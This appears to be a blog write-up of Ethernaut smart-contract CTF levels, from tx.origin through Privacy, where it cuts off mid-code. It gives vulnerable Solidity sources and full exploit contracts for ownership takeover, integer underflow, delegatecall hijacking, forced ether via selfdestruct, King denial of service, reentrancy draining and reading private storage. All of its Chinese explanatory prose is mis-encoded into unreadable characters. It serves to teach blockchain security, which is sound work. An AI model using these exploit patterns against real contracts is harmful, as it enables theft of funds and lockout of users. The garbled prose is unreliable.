<p>åœ¨solidityè£¡é¢ï¼Œtx.originæ˜¯ç™¼èµ·äº¤æ˜“æ™‚æœƒè¨˜éŒ„åœ¨stackä¸Šé¢çš„èµ·å§‹ä½ç½®ï¼Œè€Œmsg.senderå‰‡å–®ç´”çœ‹ä¿¡æ¯ä¾†æºæ˜¯èª°ï¼Œæ„å‘³è‘—ä½¿ç”¨tx.originåˆ¤æ–·ä½¿ç”¨è€…æ˜¯èª°æ˜¯ä¸å®‰å…¨çš„ã€‚<br>ç™¼èµ·ä¸­é–“äººæ”»æ“Š<br><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MitM &#123;</span><br><span class="line">    Telephone public target = Telephone(0xe905433025193D3CBF904601Aab36E6a82d6C591);</span><br><span class="line">    function attack(address _owner) public&#123;</span><br><span class="line">        target.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€å¾ŒDeployå‡ºå»ï¼Œå†attack(è‡ªå·±çš„åœ°å€)å³å¯ã€‚  </p>
<h2 id="Level-5-Token"><a href="#Level-5-Token" class="headerlink" title="Level 5 Token"></a>Level 5 Token</h2><p>ä¸€å€‹åŸºæœ¬çš„Tokenç³»çµ±ï¼Œåˆå§‹é€²å…¥æ™‚æœƒçµ¦ä½ 20å€‹token<br>ä»»å‹™ï¼š  </p>
<ol>
<li>è®“è‡ªå·±çš„balance&gt;20</li>
</ol>
<p><strong>Source code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§€å¯Ÿåˆ°å®ƒä½¿ç”¨äº†uint256é€²è¡Œè³‡æ–™å„²å­˜ï¼Œæ‰€ä»¥å„˜ç®¡æœƒæª¢æŸ¥é¤˜é¡ï¼Œåªè¦è¼¸å…¥åƒæ˜¯ $2^{256} - 1$  ä¹‹é¡çš„æ•¸å­—å°±å¯ä»¥å®ŒæˆInterger Overflowçš„æ”»æ“Šï¼Œè®“é¤˜é¡è®Šæˆ $20+(2^{256} - 1)&#x3D;21(mod 2^{256})$<br><img src="https://hackmd.io/_uploads/B1Ndp6OJ1l.png" alt="image">  </p>
<h2 id="Level-6-Delegation"><a href="#Level-6-Delegation" class="headerlink" title="Level 6 Delegation"></a>Level 6 Delegation</h2><p>ä»»å‹™ï¼š  </p>
<ol>
<li>è®Šæˆowner</li>
</ol>
<p>æ‰€è¬‚çš„delegationï¼Œä»¥é€™é¡Œè€Œè¨€å°±æ˜¯å¯ä»¥åœ¨Delegationçš„åˆç´„è£¡èª¿ç”¨Delegateçš„å‡½æ•¸ï¼ˆä¸åŒ…å«ç’°å¢ƒï¼‰ï¼Œè€Œfallbackå‡½æ•¸å‰‡æ˜¯è¢«å‚³å…¥ç©ºå€¼æ™‚æœƒèª¿ç”¨åˆ°çš„å‡½æ•¸ï¼Œæ‰€ä»¥ä»¥é€™é¡Œè€Œè¨€ç™¼å€‹ç©ºçš„pwn()éå»Delegationåˆç´„å³å¯ã€‚<br><del>ä¸éé€™é¡Œå¦‚æœæƒ³éå‘¼å«ä¸€ä¸‹Delegateåˆç´„çš„pwn()å°±å¥½(X)</del>  </p>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…·é«”åˆ©ç”¨æ–¹æ³•ç‚ºå–å¾—pwn()çš„Keccack-256 hashå‰4 byteså¾€Delegationé€å°±å¥½ã€‚<br><a target="_blank" rel="noopener" href="https://emn178.github.io/online-tools/keccak_256.html">Online Keccack-256(link)</a><br><img src="https://hackmd.io/_uploads/S1_2b0_1kx.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/SJS-GCOy1e.png" alt="image">  </p>
<p>PWNED!!  </p>
<h2 id="Level-7-Force"><a href="#Level-7-Force" class="headerlink" title="Level 7 Force"></a>Level 7 Force</h2><p>Victimâ€™s address: 0x52C5746DA9D2Ebd076e06A3F99D3415132AA4129  </p>
<p>ä¸€å€‹ç©ºçš„åˆç´„<br>ä»»å‹™ï¼š  </p>
<ol>
<li>è®“ä»–çš„balance&gt;0 ?!</li>
</ol>
<p><del>å•¥ç©æ„</del><br><strong>Source Code:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =Ã¸= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨solidityè£¡é¢ï¼Œå¦‚æœåœ¨åŒä¸€å€‹netå…§ï¼Œå¯ä»¥åˆ©ç”¨selfdestruct(addr)çš„æ–¹æ³•å°‡éŒ¢å¼·åˆ¶è½‰åˆ°åœ°å€addrï¼Œæ‰€ä»¥æœ‰äº†ä»¥ä¸‹æ”»æ“Šæœå‹™ï¼š  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleWallet &#123;</span><br><span class="line">    event Deposit(address indexed sender, uint amount);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        address payable addr = payable(address(0x52C5746DA9D2Ebd076e06A3F99D3415132AA4129));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆé€édepositè½‰å…¥ 1 wei çš„éŒ¢ï¼Œå†åˆ©ç”¨attackå‡½æ•¸è§¸ç™¼selfdestructå³å¯ã€‚  </p>
<p><img src="https://hackmd.io/_uploads/rJFkZ1tJJl.png" alt="image">  </p>
<h2 id="Level-8-Vault"><a href="#Level-8-Vault" class="headerlink" title="Level 8 Vault"></a>Level 8 Vault</h2><p>ä»»å‹™ï¼š  </p>
<ol>
<li>é€å‡ºæ­£ç¢ºçš„å¯†ç¢¼</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨solidityä¸­ï¼ŒæŠŠä¸€å€‹è®Šæ•¸è¨­ç‚ºprivateåƒ…ä»£è¡¨å®ƒä¸æœƒè¢«å…¶ä»–åˆç´„èª¿ç”¨ï¼Œä¸ç­‰æ–¼æŸ¥ä¸åˆ°ã€‚<br>å°‹æ‰¾æ–¹æ³•ï¼ˆRemix IDE consoleï¼‰ï¼š  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SyEJsgKyJe.png" alt="image">  </p>
<p>æ‹¿åˆ°ã„ŒXDï¼Œé€éunlockå‡½æ•¸é€å›å»å³å¯ã€‚  </p>
<h2 id="Level-9-King"><a href="#Level-9-King" class="headerlink" title="Level 9 King"></a>Level 9 King</h2><p>Victimâ€™s address: 0xa0E4564E6bb136c3563af930Fcd6f6ebBf8a6729<br>ä»»å‹™ï¼š  </p>
<ol>
<li>è®“åˆ¥äººç„¡æ³•å†è½‰å¸³é€²ä¾†</li>
</ol>
<p>é€™å€‹åˆç´„æœƒè¨‚å®šä¸€å€‹prizeçš„å€¼ï¼Œå¦‚æœä½ æƒ³æˆç‚ºKingï¼Œä½ éœ€è¦è½‰å…¥å¤§æ–¼prizeçš„ä¸€ç­†éŒ¢ï¼Œè€Œä½ å¯ä»¥ç²å–ä»¥å‰çš„prizeé‡‘é¡ï¼ˆ<del>é¾æ°é¨™å±€ä¾†è‘—</del>ï¼‰  </p>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>solidityè£¡é¢çš„transferä¸­ï¼Œå¦‚æœèª¿ç”¨å°è±¡çš„åœ°å€æ˜¯ä¸€å€‹åˆç´„ï¼Œé‚£å®ƒæœƒä¾åºå»è§¸ç™¼<code>receive -&gt; fallback</code>  </p>
<p>ç„¶è€Œï¼Œä»Šå¤©å¦‚æœæ”»æ“Šè€…åˆç´„çš„fallbackå‡½æ•¸æ˜¯å£æ‰çš„ï¼Œä¸¦åœ¨ä¸€é–‹å§‹å»è½‰å¸³ä½”é ˜äº†ç›®å‰Kingçš„èº«åˆ†ï¼Œå°‡æœƒå°è‡´å…¶ä»–ç”¨æˆ¶ç„¡æ³•è½‰å¸³æˆåŠŸä¸¦æˆç‚ºæ–°çš„Kingã€‚  </p>
<p><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleWallet &#123;</span><br><span class="line">    event Deposit(address indexed sender, uint amount);</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        address payable addr = payable(address(0xa0E4564E6bb136c3563af930Fcd6f6ebBf8a6729));</span><br><span class="line">        (bool success, ) = addr.call&#123;value: 1000000000000001&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        require(false);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€æ¨£éƒ¨ç½²åœ¨Remix IDEï¼Œå…ˆç”¨depositå‡½æ•¸å¹«å®ƒå……å€¼ä¸€ä¸‹å†é€éattackè½‰å¸³åˆ°Victimé‚£  </p>
<h2 id="Level-10-Re-entrancy"><a href="#Level-10-Re-entrancy" class="headerlink" title="Level 10 Re-entrancy"></a>Level 10 Re-entrancy</h2><p>Victimâ€™s address: 0x1A1D0331408f581F2566B57a2456286171d7F0a1<br>ä»»å‹™ï¼š  </p>
<ol>
<li>æŠŠæ‰€æœ‰éŒ¢é ˜èµ°</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é‡å…¥æ”»æ“Š</strong><br>(Re-entrancy Attack)ï¼Œå¦‚ä¸Šé¢çš„ç¨‹å¼æ‰€ç¤ºï¼Œwithdrawå‡½æ•¸æ˜¯å…ˆç”¨callæŠŠéŒ¢è½‰å…¥å°æ–¹å¸³æˆ¶å†ç¢ºèªammountï¼Œè½èµ·ä¾†å¾ˆæ­£å¸¸â€¦<br>ä½†ä»Šå¤©å¦‚æœè½‰å…¥çš„å¸³æˆ¶åœ°å€æ˜¯ä¸€å€‹åˆç´„ï¼Œä¸¦ä¸”fallbackå‡½æ•¸ï¼ˆæ‰¿ä¸Šé¡ŒçŸ¥è­˜é»ï¼šcallé€²ä¾†çš„æ™‚å€™å°±æœƒè§¸ç™¼fallbackï¼‰æœƒå†æ¬¡å»è«‹æ±‚Victimçš„withdraw?!  </p>
<p>ç¬é–“è®Šæˆä¸æ–·å¡åœ¨ææ¬¾éšæ®µï¼Œå°è‡´æ ¹æœ¬æ²’è¾¦æ³•é€²è¡Œåˆ°amountçš„æª¢æŸ¥  </p>
<p><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Reentrance&#123;</span><br><span class="line">    function donate(address _to) external payable;</span><br><span class="line">    function withdraw(uint _amount) external;</span><br><span class="line">    function balanceOf(address _who) external view returns (uint balance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WhaleWallet &#123;</span><br><span class="line">    Reentrance public victim = Reentrance(0x1A1D0331408f581F2566B57a2456286171d7F0a1);</span><br><span class="line"></span><br><span class="line">    address payable public target = payable(address(0x1A1D0331408f581F2566B57a2456286171d7F0a1));</span><br><span class="line"></span><br><span class="line">    event Deposit(address indexed sender, uint amount);</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Must send some ether&quot;);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        victim.donate&#123;value: 0.0001 ether&#125;(address(this));</span><br><span class="line">        victim.withdraw(0.0001 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        victim.withdraw(0.0001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Level-11-Elevator"><a href="#Level-11-Elevator" class="headerlink" title="Level 11 Elevator"></a>Level 11 Elevator</h2><p>Victimâ€™s address: 0xcFb281781d8f9a09EE3Ba9C400bCDBF6b284f06a<br>ç›®æ¨™ï¼š  </p>
<ol>
<li>æ”¹è®Š floor çš„å€¼  </li>
<li>top æ˜¯ true</li>
</ol>
<p><strong>Source Code</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®ƒæœƒå»èª¿ç”¨ç™¼é€åœ°å€çš„isLastFloorå‡½æ•¸ï¼Œå¦‚æœè«‹æ±‚çµæœç¬¬ä¸€æ¬¡æ˜¯falseï¼Œfloorå°±æœƒè¢«æ›´æ–°ï¼Œç„¶å¾Œtopæœƒè®Šæˆå†æ¬¡è«‹æ±‚isLastFlootçš„çµæœã€‚  </p>
<p>æƒ³é”æˆä»»å‹™ï¼Œåªéœ€è¦å¯«ä¸€å€‹ç¬¬ä¸€æ¬¡æœƒå›å‚³falseï¼Œç¬¬äºŒæ¬¡æœƒå›å‚³trueçš„å‡½æ•¸å³å¯~  </p>
<p><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">    function goTo(uint256 _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WhaleHouse&#123;</span><br><span class="line">    uint256 public meow=0;</span><br><span class="line">    Elevator public target = Elevator(0xcFb281781d8f9a09EE3Ba9C400bCDBF6b284f06a);</span><br><span class="line">    function isLastFloor(uint256 floor) payable public returns(bool)&#123;</span><br><span class="line">        if(meow==0)&#123;</span><br><span class="line">            meow=1;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public payable&#123;</span><br><span class="line">        target.goTo(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>deployå¥½æŒ‰ä¸‹attackï¼Œæœ€å¾Œæª¢æŸ¥meowæ˜¯ä¸æ˜¯è®Šæˆ1å°±çŸ¥é“æ˜¯å¦é€šé—œäº†ï¼  </p>
<h2 id="Level-12-Privacy"><a href="#Level-12-Privacy" class="headerlink" title="Level 12 Privacy"></a>Level 12 Privacy</h2><p>Victimâ€™s address: 0x2b7c7D52206360eD5797bB108cD4Ee24e2Daf367<br>ä»»å‹™ï¼š  </p>
<ol>
<li>æ‹¿åˆ°å¯†ç¢¼é€šé—œ</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span 